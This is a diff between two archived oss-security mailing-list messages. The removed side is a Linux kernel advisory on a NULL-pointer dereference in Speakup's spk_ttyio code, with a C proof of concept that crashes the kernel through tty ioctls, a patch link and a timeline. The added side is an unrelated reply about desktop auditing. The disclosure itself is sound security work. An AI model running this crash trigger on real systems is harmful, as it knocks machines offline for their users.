@@ -1,78 +1,29 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/12/07/1
-Message-ID: <CAM1BPE5H=DB0=83v4+i4pqUCJeJre5UTv5XSSV1MoX-4Ufyb0A@mail.gmail.com>
-Date: Mon, 7 Dec 2020 10:20:44 +0800
-From: Shisong Qin <qinshisong1205@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/06/1
+Message-ID: <5643462.lOV4Wx5bFT@x2>
+Date: Mon, 05 Oct 2020 22:36:14 -0400
+From: Steve Grubb <sgrubb@...hat.com>
 To: oss-security@...ts.openwall.com
-Cc: nopitydays@...il.com
-Subject: Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2
+Cc: Solar Designer <solar@...nwall.com>
+Subject: Re: major changes if gnu/linux dominates the desktop and/or mobile market?
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+On Monday, October 5, 2020 4:48:20 PM EDT Solar Designer wrote:
+> On the desktop, major Linux distributions (and by the way *BSDs and
+> Solaris are not very different in this respect, I think) when used as
+> single-user desktop systems lack security isolation between applications
+> of the user.  (And also between the user and root, due to the typical
+> recommended use of sudo from the user account.)
 
-Recently we found another NULL-ptr deref BUG in spk_ttyio.c in the latest
-Linux kernel(5.9.11 is the latest at that now). In the
-spk_ttyio_receive_buf2() function, it would dereference spk_ttyio_synth
-without checking whether it is NULL or not, and may lead to a NULL-ptr
-deref crash.
+I will skip the whole discussion on access control. However to prove security 
+requires going through a Common Criteria certification. The biggest issue is 
+that the desktoptop uses dbus instantiation which does not have the auid of 
+the requesting process. Meaning audit cannot work.
 
-This bug could be reproduced in the Linux kernel (e.g. 5.9.11) with
-CONFIG_ACCESSIBILITY=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y, and here is a
-simple poc:
+The fix was kdus. That was rejected. But the issue remains. There cannot be a 
+secure desktop without auditing. And no one is really pushing for a desktop 
+certification, therefore no one is pushing to fix audit desktop problems.
 
-#define _GNU_SOURCE
+-Steve
 
-#include <dirent.h>
-#include <endian.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <stdarg.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/stat.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <time.h>
-#include <unistd.h>
-
-#pragma pack(1)
-typedef struct {
-        char subcode;
-        short xs, ys, xe, ye;
-        short sel_mode;
-} sel_struct;
-
-int main(int argc, char const *argv[]) {
-
-    int disc = 0x1a;
-    int fd = open("/dev/tty1", 0, 0);
-    ioctl(fd, 0x5423, &disc);
-
-    sel_struct sel;
-    sel.subcode = 2;
-    sel.xs = sel.ys = sel.xe = sel.ye = 0;
-    sel.sel_mode = 0x0; // sel_mode = 0x0/0x1/0x2 could trigger this
-NULL-ptr dereference bug
-    ioctl(fd, 0x541c, &sel);
-    char data = 3;
-    ioctl(fd, 0x541c, &data);
-    return 0;
-}
-
-Here is the commit to patch this BUG:
-https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/char-misc.git/commit/?h=char-misc-linus&id=f0992098cadb4c9c6a00703b66cafe604e178fea
-
-Timeline:
-* 2020/11/24 - Vulnerability reported to security@...nel.org
-* 2020/11/29 - Vulnerability confirmed, and reported to
-linux-distros@...openwall.org.
-* 2020/12/7 - Vulnerability opened.
-
-Thanks, Shisong Qin and Bodong Zhao, Tsinghua University
 
